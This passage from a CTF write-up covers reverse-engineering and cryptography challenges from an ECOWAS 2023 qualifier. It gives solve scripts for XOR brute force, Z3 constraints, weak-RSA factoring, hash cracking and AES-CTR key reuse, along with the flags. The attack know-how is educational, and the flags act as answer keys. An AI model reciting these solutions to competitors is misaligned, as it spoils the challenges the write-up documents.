But first I'll decompile it using `ILSPY` which is a `.NET` decompiler for Linux Based OS

Here's the main function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/38513004-1313-4235-84e0-c6ae67a06c2b)

```c#
	private static void Main(string[] args)
	{
		Console.WriteLine("Hello!");
		Console.WriteLine("Send me 4 characters and I can decrypt something for you...");
		Console.WriteLine(Dec("PD1VICE4WRgpOVU1KjRGGC45VSkFKFsyBSVcLjQ6SQ==", Console.ReadLine()));
		Console.WriteLine("Bye-byte!");
		Console.ReadKey();
	}
}
```

We can see that it will ask for 4 character then that 4 character string is passed into the `Dec` function also with the base64 encoded flag

Here's the `Dec` decompiled function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/55c81f74-cdf6-4cb2-a53a-bb55196d3453)

```c#
private static string Dec(string enctext, string pad)
{
	byte[] source = Convert.FromBase64String(enctext);
	byte[] key = Encoding.UTF8.GetBytes(pad);
	return Encoding.UTF8.GetString(source.Select((byte b, int i) => (byte)(b ^ key[i % key.Length])).ToArray());
}
```

Basically what this does is to decode the first parameter passed into it and then encodes the key which is the second parameter to `utf-8`

After that is done it will xor they parameter with the key

Ok now that we know that we can implement that in python also

But what of the encrypt function 🤔 

It's not really of any help but it xor the plaintext with a key
![image](https://github.com/markuched13/CTFLearn/assets/113513376/48f09dae-9eb1-4022-88b0-764742dc1337)

```c#
private static string Enc(string plaintext, string pad)
{
	byte[] bytes = Encoding.UTF8.GetBytes(plaintext);
	byte[] key = Encoding.UTF8.GetBytes(pad);
	return Convert.ToBase64String(bytes.Select((byte b, int i) => (byte)(b ^ key[i % key.Length])).ToArray());
}
```

Since we know the key is just 4 bytes

It can be easily brute forced

I did that in python

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/DotNetBin/solve.py)

```python
from base64 import b64decode as d

def xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def brute(ct):
    possible_keys = [ord(char) for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"]
    
    for key1 in possible_keys:
        for key2 in possible_keys:
            for key3 in possible_keys:
                for key4 in possible_keys:
                    key = bytes([key1, key2, key3, key4])
                    decrypted = xor(ct, key)
                    print(f"Key: {chr(key1)}{chr(key2)}{chr(key3)}{chr(key4)},  Plaintext: {decrypted}")

if __name__ == "__main__":
    b_ct = "PD1VICE4WRgpOVU1KjRGGC45VSkFKFsyBSVcLjQ6SQ=="
    ct = d(b_ct)

    brute(ct)
```

After running, it prints many result but eventually you will get the key to be `ZQ4G` and also the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d8b24291-acca-4ee4-9755-414180122dea)

```
Flag: flag{im_sharper_than_you_think}
```

#### Tometriii
![image](https://github.com/markuched13/CTFLearn/assets/113513376/4f7d1887-d96d-43b4-bf8f-873933d6a7e3)

The first thing I noticed there is the flag format

I read ctf writeups and well aware about the fact that the flag is Hong Kong Cert CTF format

So I looked for writeup and found the solution to that 

Here's the [solution](https://github.com/blackb6a/hkcert-ctf-2022-challenges/tree/main/13-middle-road/writeup)

To be honest if this wasn't a copied challenge we might not pull it off 😂

```
Flag: hkcert22{CLi3NT_can_B3_reverSE_EnGIN33red_by_0ne_W4y_or_aNoTh3r}
```

#### ReZerv3
![image](https://github.com/markuched13/CTFLearn/assets/113513376/bb226182-5c9e-443f-8787-4b20992056b1)

From the challenge description we can tell we'll be using Z3 to solve that

After downloading the attached file and checking the file type I got this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fe71b532-c5c9-4e44-8025-3e67e83341e2)

We are working with a x64 binary which is dynamically linked and not stripped

I'll run it to know what it does
![image](https://github.com/markuched13/CTFLearn/assets/113513376/15a9434a-7fd9-4d42-ae75-31bd3bcac4ba)

It requires an argument to be passed into then it prints out Incorrect if wrong and Correct if right

Seems like a job for angr also

Using ghidra I decompiled the binary

Here's the main function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/8180d540-e713-4eda-a969-70d2870dce76)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6409fc7f-55cf-41c6-9540-95211815c33e)
```c
undefined main(int param_1,undefined8 *param_2)

{
  char *__s;
  size_t sVar1;
  
  if (param_1 == 2) {
    __s = (char *)param_2[1];
    sVar1 = strlen(__s);
    if (sVar1 == 0x22) {
      if (((((((((((int)__s[7] - (int)__s[8] * (int)__s[5] * (int)__s[6] * (int)__s[2]) -
                 (int)__s[0xb]) - (int)__s[9]) + (int)__s[1] + (int)__s[4] + (int)__s[3]) -
               (int)__s[10] == -0x391825f) &&
             ((int)__s[5] +
              (((((int)__s[3] - (int)__s[4]) - (int)__s[6]) + (int)__s[9] +
               (int)__s[8] * (int)__s[10] * (int)__s[0xb]) - (int)__s[2]) +
              (int)__s[0xc] * (int)__s[7] == 0x4ac36)) &&
            ((int)__s[0xb] +
             (((((int)__s[3] - (int)__s[0xc] * (int)__s[7]) - (int)__s[0xd]) +
              (int)__s[10] * (int)__s[4]) - (int)__s[5] * (int)__s[6] * (int)__s[9]) + (int)__s[8]
             == -0xe6fc0)) &&
           (((((((((int)__s[0xc] - (int)__s[7] * (int)__s[0xb]) + (int)__s[4]) - (int)__s[9]) -
               (int)__s[5] * (int)__s[6]) - (int)__s[0xe]) -
              (int)__s[8] * (int)__s[10] * (int)__s[0xd] == -0x935bc &&
             ((int)__s[9] * (int)__s[10] * (int)__s[8] +
              (((((int)__s[6] + (int)__s[7] + (int)__s[0xe] + (int)__s[0xd]) - (int)__s[0xc]) -
               (int)__s[0xf] * (int)__s[0xb]) - (int)__s[5]) == 0xba254)) &&
            (((int)__s[0xc] +
              ((((((int)__s[0xd] + (int)__s[0xb]) - (int)__s[10]) + (int)__s[0xf] * (int)__s[0x10] +
                (int)__s[6] * (int)__s[8]) - (int)__s[7]) - (int)__s[9]) + (int)__s[0xe] == 0x2298
             && (((((((((int)__s[0xb] - (int)__s[8]) + (int)__s[0x10] * (int)__s[0xd] + (int)__s[7])
                     - (int)__s[0x11]) - (int)__s[0xe]) - (int)__s[9]) +
                  (int)__s[10] * (int)__s[0xf]) - (int)__s[0xc] == 0x2e4a &&
                 (((((((int)__s[9] - (int)__s[0x12]) - (int)__s[8]) + (int)__s[0xc]) - (int)__s[0xf]
                   ) + (int)__s[0x10] + (int)__s[0xb] * (int)__s[0xd] * (int)__s[0xe] +
                  (int)__s[0x11]) - (int)__s[10] == 0x39e7d)))))))) &&
          (((((((int)__s[0x10] * (int)__s[0x12] * (int)__s[0xd] * (int)__s[0xb] - (int)__s[0x11]) -
              (int)__s[10]) + (int)__s[9] + (int)__s[0xf] * (int)__s[0xc]) - (int)__s[0x13]) -
            (int)__s[0xe] == 0xb8a12a &&
           (((((((((((((int)__s[0x14] + (int)__s[0xc]) -
                     (int)__s[0xe] * (int)__s[0x13] * (int)__s[0xf] * (int)__s[0x12]) +
                    (int)__s[0x10]) - (int)__s[0xd]) + (int)__s[0x11]) - (int)__s[0xb]) -
                 (int)__s[10] == -0x1416994 &&
                ((int)__s[0xe] +
                 (((int)__s[0x10] - (int)__s[0x13]) - (int)__s[0xf]) +
                 (int)__s[0x14] * (int)__s[0x11] + (int)__s[0xb] * (int)__s[0xd] + (int)__s[0x12] +
                 (int)__s[0x15] * (int)__s[0xc] == 0x3f91)) &&
               ((int)__s[0x12] * (int)__s[0x10] +
                ((((int)__s[0xf] * (int)__s[0x11] - (int)__s[0x14]) - (int)__s[0xc]) -
                (int)__s[0x13] * (int)__s[0xe]) + (int)__s[0x15] * (int)__s[0xd] + (int)__s[0x16] ==
                0x287b)) &&
              (((int)__s[0x17] * (int)__s[0x11] +
                ((((((int)__s[0x15] + (int)__s[0xd] * (int)__s[0x13]) - (int)__s[0x16]) -
                  (int)__s[0x10]) + (int)__s[0x12] + (int)__s[0x14] + (int)__s[0xf]) - (int)__s[0xe]
                ) == 0x42ba &&
               (((((int)__s[0x17] + (int)__s[0x10] * (int)__s[0xe] + (int)__s[0xf] * (int)__s[0x14])
                 - (int)__s[0x12] * (int)__s[0x15]) + (int)__s[0x13] * (int)__s[0x18]) -
                (int)__s[0x16] * (int)__s[0x11] == 0xcea)))) &&
             (((int)__s[0x13] +
               (((int)__s[0x10] + (int)__s[0x19] + (int)__s[0x15] + (int)__s[0x16] + (int)__s[0x18]
                 + (int)__s[0x12] + (int)__s[0x14] * (int)__s[0x17]) - (int)__s[0xf]) +
               (int)__s[0x11] == 0x1b23 &&
              (((int)__s[0x12] * (int)__s[0x13] * (int)__s[0x16] +
                (((((int)__s[0x17] * (int)__s[0x11] + (int)__s[0x14] * (int)__s[0x19]) -
                  (int)__s[0x10]) + (int)__s[0x1a] * (int)__s[0x15]) - (int)__s[0x18]) == 0x68c60 &&
               ((int)__s[0x17] +
                ((((int)__s[0x11] * (int)__s[0x18] +
                   (int)__s[0x1b] * (int)__s[0x19] * (int)__s[0x16] + (int)__s[0x1a] +
                  (int)__s[0x14]) - (int)__s[0x15]) - (int)__s[0x13] * (int)__s[0x12]) == 0x4fc8d)))
              ))) && ((int)__s[0x12] +
                      (((((((int)__s[0x15] * (int)__s[0x19] + (int)__s[0x16]) - (int)__s[0x1c]) -
                         (int)__s[0x13]) - (int)__s[0x1a] * (int)__s[0x14] * (int)__s[0x1b]) +
                       (int)__s[0x18]) - (int)__s[0x17]) == -0x54b27)))))) &&
         (((((int)__s[0x14] +
             (((((((int)__s[0x1d] + (int)__s[0x19] + (int)__s[0x13]) - (int)__s[0x18]) -
                (int)__s[0x15]) - (int)__s[0x17]) + (int)__s[0x1c] + (int)__s[0x1b]) -
             (int)__s[0x16] * (int)__s[0x1a]) == -0x1db5 &&
            (((((((int)__s[0x1a] + (int)__s[0x16] * (int)__s[0x17] + (int)__s[0x1e] + (int)__s[0x15]
                 ) - (int)__s[0x1d]) + (int)__s[0x14]) - (int)__s[0x18] * (int)__s[0x19]) -
             (int)__s[0x1b]) - (int)__s[0x1c] == 0xb4b)) &&
           (((((((((((int)__s[0x17] + (int)__s[0x1e]) - (int)__s[0x18]) + (int)__s[0x19]) -
                 (int)__s[0x1d]) - (int)__s[0x1f]) - (int)__s[0x15]) + (int)__s[0x1a]) -
             (int)__s[0x1b]) + (int)__s[0x16]) - (int)__s[0x1c] == 0x43)) &&
          (((((((((((int)__s[0x1f] - (int)__s[0x1a]) - (int)__s[0x19]) - (int)__s[0x17]) +
                (int)__s[0x1e]) - (int)__s[0x1c]) + (int)__s[0x1d]) - (int)__s[0x1b]) -
            (int)__s[0x16]) - (int)__s[0x20] * (int)__s[0x18] == -0x775 &&
           ((((((((int)__s[0x19] - (int)__s[0x1f] * (int)__s[0x17]) + (int)__s[0x1b]) -
               (int)__s[0x1a] * (int)__s[0x20]) + (int)__s[0x1e]) - (int)__s[0x18] * (int)__s[0x1d])
            + (int)__s[0x21]) - (int)__s[0x1c] == -0x2ed5)))))) {
        printf("CORRECT :)");
      }
      else {
        printf("INCORRECT :(");
      }
    }
    else {
      printf("INCORRECT :(");
    }
    return 0;
  }
  printf("Usage: %s <FLAG>",*param_2);
  return 1;
}
```

Looking at that we can immediately tell angr would take a lot of time & memory before solving that

Since the math being done there is kinda brutal lmao 😹

Anyways [Z3](https://github.com/Z3Prover/z3) is a perfect job for this

I searched for writeups and found some links which helped me create solve script

[link1](https://ctftime.org/writeup/36656)
[link2](https://yocchin.hatenablog.com/entry/2022/03/11/075100)
[link3](https://www.youtube.com/watch?v=QfYZJHYZARQ&t=1065s)

Here's the solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/reZerv3/solve.py)

```python
from z3 import *

x = [BitVec('x%d' % i, 8) for i in range(42)]

s = Solver()

for i, c in enumerate(b'EcoWasCTF{'):
    s.add(x[i] == c)

for v in x:
    s.add(v > 0x20)
    s.add(v < 0x7f)

s.add(x[3] + x[4] + x[1] + x[7] - x[2] * x[6] * x[5] * x[8] - x[11] - x[9] - x[10] == -59867743)
s.add(x[7] * x[12] + x[3] - x[4] - x[6] + x[9] + x[11] * x[10] * x[8] - x[2] + x[5] == 306230)
s.add(x[8] + x[4] * x[10] + x[3] - x[7] * x[12] - x[13] - x[9] * x[6] * x[5] + x[11] == -946112)
s.add(x[4] + x[12] - x[11] * x[7] - x[9] - x[6] * x[5] - x[14] - x[13] * x[10] * x[8] == -603580)
s.add(x[8] * x[10] * x[9] + x[13] + x[14] + x[7] + x[6] - x[12] - x[11] * x[15] - x[5] == 762452)
s.add(x[14] + x[16] * x[15] + x[11] + x[13] - x[10] + x[8] * x[6] - x[7] - x[9] + x[12] == 8856)
s.add(x[7] + x[11] - x[8] + x[13] * x[16] - x[17] - x[14] - x[9] + x[15] * x[10] - x[12] == 11850)
s.add(x[17] + x[12] + x[9] - x[18] - x[8] - x[15] + x[16] + x[14] * x[13] * x[11] - x[10] == 237181)
s.add(x[11] * x[13] * x[18] * x[16] - x[17] - x[10] + x[9] + x[12] * x[15] - x[19] - x[14] == 12099882)
s.add(x[17] + x[16] + x[20] + x[12] - x[18] * x[15] * x[19] * x[14] - x[13] - x[11] - x[10] == -21064084)
s.add(x[17] * x[20] + x[16] - x[19] - x[15] + x[13] * x[11] + x[18] + x[12] * x[21] + x[14] == 16273)
s.add(x[13] * x[21] + x[17] * x[15] - x[20] - x[12] - x[14] * x[19] + x[22] + x[16] * x[18] == 10363)
s.add(x[17] * x[23] + x[15] + x[20] + x[18] + x[21] + x[19] * x[13] - x[22] - x[16] - x[14] == 17082)
s.add(x[24] * x[19] + x[20] * x[15] + x[14] * x[16] + x[23] - x[21] * x[18] - x[17] * x[22] == 3306)
s.add(x[17] + x[24] + x[22] + x[21] + x[25] + x[16] + x[18] + x[23] * x[20] - x[15] + x[19] == 6947)
s.add(x[22] * x[19] * x[18] + x[17] * x[23] + x[25] * x[20] - x[16] + x[21] * x[26] - x[24] == 429152)
s.add(x[23] + x[20] + x[26] + x[24] * x[17] + x[22] * x[25] * x[27] - x[21] - x[18] * x[19] == 326797)
s.add(x[18] + x[24] + x[22] + x[25] * x[21] - x[28] - x[19] - x[27] * x[20] * x[26] - x[23] == -346919)
s.add(x[20] + x[28] + x[19] + x[25] + x[29] - x[24] - x[21] - x[23] + x[27] - x[26] * x[22] == -7605)
s.add(x[21] + x[30] + x[26] + x[23] * x[22] - x[29] + x[20] - x[25] * x[24] - x[27] - x[28] == 2891)
s.add(x[22] + x[26] + x[25] + x[30] + x[23] - x[24] - x[29] - x[31] - x[21] - x[27] - x[28] == 67)
s.add(x[29] + x[30] + x[31] - x[26] - x[25] - x[23] - x[28] - x[27] - x[22] - x[24] * x[32] == -1909)
s.add(x[33] + x[25] - x[23] * x[31] + x[27] - x[32] * x[26] + x[30] - x[29] * x[24] - x[28] == -11989)

r = s.check()
assert r == sat

m = s.model()
flag = ''
for i in x:
    flag += chr(m[i].as_long())
    
print(flag)
```

Running it gives the flag with some null bytes appended to it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/55ec68ee-6005-4591-999c-0d88e64d18bd)

We can confirm it's the flag by passing it as the argument required by the binary
![image](https://github.com/markuched13/CTFLearn/assets/113513376/e2c2381f-3272-484e-b38a-0ecab05e995e)

```
Flag: EcoWasCTF{Y0U_4R3_4_M4ST3R_0F_Z3!}
```

### Cryptography 11/11

#### Decode_Me 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/47125e97-8aab-4715-8cb0-47f5d35320e2)

We are given a value to decode

I just used cyberchef to decode that
![image](https://github.com/markuched13/CTFLearn/assets/113513376/dbf4c249-7f5a-48c4-a471-fb5d0f552ff0)

```
Flag: flag{can_you_feel_the_encoding_now?}
```

#### Hashes
![image](https://github.com/markuched13/CTFLearn/assets/113513376/a36b7b1c-6c28-4a8b-86cb-35c92688f6d8)

We are given a hash which looks like MD5

To crack it I used crackstation
![image](https://github.com/markuched13/CTFLearn/assets/113513376/cca38284-7577-434c-b23e-910a26914ad8)

```
Flag: flag{dolphins11}
```

#### Read Me Please
![image](https://github.com/markuched13/CTFLearn/assets/113513376/8e51a008-099d-404c-8b0e-a0e156369092)

After downloading the attached file, on checking the content gave this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9e2bce86-7e71-401d-bba8-0a31c9bd1dfe)

They are lots of space characters we can confirm that by viewing the hex dump
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b51f75a6-b1ba-4375-9cbb-082d952efd8a)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b2acfa76-e460-4fc0-b0a0-a131c3b4444f)

Ok they are not really space but like dots and tabs

This stenography is called Steg Snow

And to decode it I used stegsnow
![image](https://github.com/markuched13/CTFLearn/assets/113513376/492f2994-fee1-4078-b76b-9c2e3df8f378)

```
stegsnow -C Motivation_Text_For_You.txt
```

It gives the hex dump of a value 

I then used cyberchef to decode that
![image](https://github.com/markuched13/CTFLearn/assets/113513376/ef8a6454-35f7-4b9d-a35a-da9084d8a34a)

```
Flag: flag{Persisting with determination is always worthwhile.Never give up!....}
```

#### IZRSA
![image](https://github.com/markuched13/CTFLearn/assets/113513376/806ef19f-b17e-41f6-ab64-69518ce3c769)

We are given the following values:
- The public modulus `n`
- The ciphertext `c`
- The public exponent `e`

The first thing I'll do is to check if the value of `n` can be factorized
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6e62fed3-dde1-429f-9cbd-6719150abf22)

Cool it can be factorized now that we know that we have the two prime numbers used to form the public modulus

At this point I'll need the private exponent which is needed to decrypt the ciphertext

To find the private exponent `d,` we use the fact that `e*d = 1 (mod tot(n))`, where `tot(n) = (p-1)*(q-1)` this is also known as the Euler totient function
![1](https://github.com/markuched13/CTFLearn/assets/113513376/6fddadc2-2dc0-4288-9d23-6567b2574484)

And after getting `d` we can just decrypt ciphertext to get the plaintext which should contain the flag

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/Izrsa/solve.py)

```python
from Crypto.Util.number import long_to_bytes, inverse

N = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807
c = 253531916432322298053250937193688715804675877467421863721500099250994106573287490406946422261539808641643579360867972587480442118769784193102040867769698847348444487381478224610267159208895311306363039022363007025402831809706871344008605633536701876907909395530746273077680104860539268870737996595986255451860526076417328003406583877583122138052686641536049736650895970946946035823502502768574935902696678047030376591729571293315520443583996286045618057879759381
e = 65537

p = 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122393
q = 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122399

phi = (p - 1) * (q - 1)
d = inverse(e, phi)

pt = pow(c, d, N)
print(long_to_bytes(pt).decode())
```

Running it gives the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fd5c1917-b75b-43fb-8637-0b1e5f3a94a8)

```
Flag: EcowasCTF{i_h4ve_an_RSA_fetish_;)}
```

#### Ron Adi Leonard
![image](https://github.com/markuched13/CTFLearn/assets/113513376/fefea961-65f4-47a9-934e-434793ba6e23)

We are given the encoded flag and a RSA public key
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d563527b-48fc-4a20-b3f5-692e4eb843ca)

Since the public key is generated from the public modulus and exponent we need to extract it

To do that I used this [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/Ron%20Adi%20Leonard/extract.py)

```python
from Crypto.PublicKey import RSA

public_key = open('public.pem', "rb").read()
key = RSA.importKey(public-key)

print(repr(key))
```

Running it gives the value of `n` and `e`
![image](https://github.com/markuched13/CTFLearn/assets/113513376/eab61c0c-1349-4b1e-81f4-d7bce79a9be4)

Next thing I'll do is to check if I can factorize `n` 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/14839002-0cae-4e57-b20d-b9fde7e77c63)

Cool we can! This makes it easy to solve since we can now get `d` which is the private exponent

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/Ron%20Adi%20Leonard/solve.py)

```python
#!/usr/bin/python3
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse

n = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807
e = 65537

p = 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122393
q = 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122399

phi = (p-1) * (q-1)
d = inverse(e, phi)


enc = bytes_to_long(open('flag.enc', 'rb').read())
pt = pow(enc, d, n)
print(long_to_bytes(pt))
```

Running the script gives the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/299bd051-da1e-4947-91e4-3dea05bcf4a8)

```
Flag: EcoWAS{Let_me_try_RSA}
```

#### Sakpatè 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/30cb8d64-7a40-41b5-8094-fdb2878af2cb)

From the description of the challenge we are dealing with XOR bitwise operation

No key was provided so I assumed the key was just a single byte i.e `0-0xff`

I used cyberchef to brute force it though I would have just easily scripted this but yunno `CTF == TIME`
![image](https://github.com/markuched13/CTFLearn/assets/113513376/0639299f-de92-4a67-927e-10f94b5665cd)

```
Flag: flag{xor_puts_the_fun_in_fundamental}
```

#### Kashe Kanka 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/7965f548-251a-40fa-a1e7-d34e0ebe4c0b)

We are given a base64 encoded value and told that it's encrypted with a key of length 7 

One thing we can try apply to decode that is using XOR which is a bitwise operation

But the issue is that we don't have the complete key 

It's actually isn't a problem and that's so because of the commutative property of XOR:

```
a ^ b = c
b ^ c = a
c ^ a = b
```

With that we can get the key!!

But it won't be the complete 7 character key but where as just 5 character
 
That's so because the known plaintext is `flag{` whose length is 5

So the remaining two characters can be easily brute forced

With that said, to get the key we need to xor our known plaintext with base64 decoded flag

I used python pwn.xor module to do that
![image](https://github.com/markuched13/CTFLearn/assets/113513376/a7c4c343-f7be-488e-844d-e6dfde598d42)

```python
➜  KasheKanka python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from warnings import filterwarnings
>>> filterwarnings('ignore')
>>> from base64 import b64decode as d
>>> from pwn import xor
^[[A
>>> pt = "flag{"
>>> ct = d("IAUPA1sVCjQ2HhFUHjoyAQs7UBgLGQAAO1AYCxkLDxdFCTogBQ8DXQ==")
>>> key = xor(pt, ct)[:len(pt)]
>>> 
>>> key
b'Find '
>>> 
>>> len(key)
5
>>>
```

The first 5 characters of our key is `Find ` 

Notice that there's a space character after letter `d` which makes the length 5

Now to brute force it I just made a sily script 

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/kashe%20kanka/solve.py)

After running it, I got lot of output but eventually saw a readable word
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d0360634-4930-4045-b651-66c944dd7fee)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/674dc1b9-64f7-4b24-9eef-1b08c6f2d7e4)

```
Flag: flag{xor_puts_the_pun_in_pun_based_flag}
```

#### Goumin Fraca 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/420cf8e4-4786-45a7-a14e-19b792068942)

We are given various encrypted keys and a RSA public key
![image](https://github.com/markuched13/CTFLearn/assets/113513376/97267709-d4d5-442b-b19d-6c6451f72ba9)

Just follow the step I used to solve `Ron Adi Leonard`

You will get that `n` can be factorized from there get the value of `d`

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/goumin%20fraca/solve.py)

```python
from Crypto.Util.number import *

p = 198828927652291316291569791180652465177
q = 315962916257647735873011221555688457883
N = p*q
d = 21178903723966760155190844763458177452716443299090469143032403667752371418657

# convert key*.enc to hex using cyberchef
key0 = bytes.fromhex('0e48d8a6371ca3888f2b8514be91dba5e7ce3b5428c73ef1493f79530cb348be')
enc0 = bytes_to_long(key0)
key1 = bytes.fromhex('5e1c7116f70832d547a734d600715bc677201bb6acf233c12af64f7107134d2b')
enc1 = bytes_to_long(key1)
key2 = bytes.fromhex('0b03a010e0eb7de447f00a215ee4b5d3251e686dd8b4c4113a5a8161e9fde703')
enc2 = bytes_to_long(key2)
key3 = bytes.fromhex('34d14a15a86607da5d16faa5c3ba7224b440edf6c363401d1fa580fe614e1f72')
enc3 = bytes_to_long(key3)

decoded = []
decoded.append(pow(enc0, d, N))
decoded.append(pow(enc1, d, N))
decoded.append(pow(enc2, d, N))
decoded.append(pow(enc3, d, N))

for i in decoded:
    print(long_to_bytes(i).decode(), end='')
```

Running it gives the flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/312d004c-bde4-4fbf-aefb-6b538749221b)

```
Flag: flag{43bc9aaf8b315435c2459fcb5aaf710a683a917294130b64413f3814465aaf30ffb84a3e86dcf904b2da35352322fa10fccb3e70b6d6b20efb3dc756e5}
```

#### Dangbui
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d43223c0-01bb-4c62-ad31-2572767e0e71)

Downloading the attached file and checking the python script shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/ce810f31-ff15-4670-bcc2-bc9d37d14e89)

```python
#!/usr/bin/env python

from Crypto.Cipher import AES
import os
from Crypto.Util import Counter

key = os.urandom(16)

def encrypt(data) :

	cipher = AES.new(key, AES.MODE_CTR, counter=Counter.new(128))
	ciphertext = cipher.encrypt(data)
	return ciphertext.hex()

with open("flag.txt", 'rb') as f:
	flag = f.read().strip()

anthem = bytes("""Salut à toi pays de nos aïeux, 
		Toi qui les rendais forts, paisibles et joyeux, 
		Cultivant vertu, vaillance, 
		Pour la postérité. 
		Que viennent les tyrans, ton cœur soupire vers la liberté, 
		Togo debout, luttons sans défaillance, 
		Vainquons ou mourons, mais dans la dignité, 
		Grand Dieu, toi seul nous as exaltés, 
		Du Togo pour la prospérité, 
		Togolais viens, bâtissons la cité.""", "utf-8")


print(encrypt(anthem))
print(encrypt(flag))
```

From the script we can see that this implements AES CTR encryption used on the flag

And the key is 16 random bytes making brute force not fessible 😕

We are given the encrypted anthem and flag
![image](https://github.com/markuched13/CTFLearn/assets/113513376/1856d903-eb4b-464f-9f1e-c1c90437e81b)

Since we have the encrypted anthem value with it's plaintext

And the same key is being used to encrypt the flag

We therefore can perform `AES Reused Key Weakness` attack

Since AES works base on bitwise xor operation

Here's the solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/Dangbui/solve.py)

```python
import binascii
from pwn import xor

anthem = bytes(""" Salut à toi pays de nos aïeux, 
        Toi qui les rendais forts, paisibles et joyeux, 
        Cultivant vertu, vaillance, 
        Pour la postérité. 
        Que viennent les tyrans, ton cœur soupire vers la liberté, 
        Togo debout, luttons sans défaillance, 
        Vainquons ou mourons, mais dans la dignité, 
        Grand Dieu, toi seul nous as exaltés, 
        Du Togo pour la prospérité, 
        Togolais viens, bâtissons la cité.""", "utf-8")

with open('output.txt') as h:
    enc_test = binascii.unhexlify(h.readline().strip())
    enc_flag = binascii.unhexlify(h.readline().strip())

blob = xor(enc_test, enc_flag)
flag = xor(blob, anthem[:len(enc_flag)])[:len(enc_flag)]

print(flag)
```

Running the script gave the flag

```
Flag: EcoWasCTF{D0_not_Reuse_key_5897477774}
```

Here's the resource that helped me in solving that [YT](https://www.youtube.com/watch?v=Gtfr1dBGzHg)

#### NOTgate
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6b0cefac-c6b1-42bc-a08c-9b4e77855f60)

This was a fun one and it also took a while for most teams to solve not because it's hard but rather the last part to decrypt the flag isn't a common cipher

From the challenge description and name we can clearly see `NOT` highlighted

What does that have to do with Crypto 🤔

Well maybe NOT logic gate!!

Downloading the attached file shows this binary values
![image](https://github.com/markuched13/CTFLearn/assets/113513376/79acbd96-2e4a-4ed7-a87d-5c29562bf858)

If you try to decode that with cyberchef you won't get any where
![image](https://github.com/markuched13/CTFLearn/assets/113513376/56e80ac2-3612-4281-bccf-4c05488ed443)

So back to the challenge description it's referring to the NOT logic gate

And basically it returns the complement of it's value. For example:

```r
not 1 = 0
not 0 = 1
```

With that said, my team mate (@mycroft) wrote a script to swap `0` to `1`  then `1` to `0`

Here's the [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/NOTgate/swap.py)

```python=
def swap(param):
    vals = param.split()

    not_results = []

    for bin_val in vals:
        not_result = ''.join(['1' if bit == '0' else '0' for bit in bin_val])
        not_results.append(not_result)

    final_result = ' '.join(not_results)

    return final_result

